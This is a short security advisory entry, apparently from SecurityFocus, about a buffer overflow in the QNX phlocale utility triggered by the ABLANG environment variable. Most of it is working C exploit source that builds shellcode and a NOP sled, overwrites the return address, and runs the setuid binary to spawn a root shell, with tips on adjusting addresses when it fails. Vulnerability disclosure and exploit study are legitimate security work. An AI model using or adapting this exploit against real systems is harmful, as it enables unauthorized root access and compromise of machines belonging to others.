source: http://www.securityfocus.com/bid/4917/info

The QNX phlocale utility is prone to an exploitable buffer overflow condition. This is due to insufficient bounds checking of the ABLANG environment variable. Exploitation of this issue may result in execution of arbitrary attacker-supplied instructions as root. 

/* QNX phlocale $ABLANG exploit, gives you a cute euid=0 shell. 
 * If it doesnt work for you, then you most likely need to change
 * the address to system() and/or the ret.
 * 
 * www.badc0ded.com 
*/

main ()
{ 
   char s[]="\xeb\x0e\x31\xc0\x5b"
            "\x88\x43\x2\x53\xbb"
            "\x80\x95\x04\x08"       //system() address
            "\xff\xd3\xe8\xed\xff"
            "\xff\xff\x73\x68";
   char payload[1000];
   memset (payload,0x90,sizeof(payload));
   sprintf(payload+971,"%s%s",s,"\x78\x7b\x04\x08");
   setenv("ABLANG",payload);
   execlp("/usr/photon/bin/phlocale","phlocale",0);
}


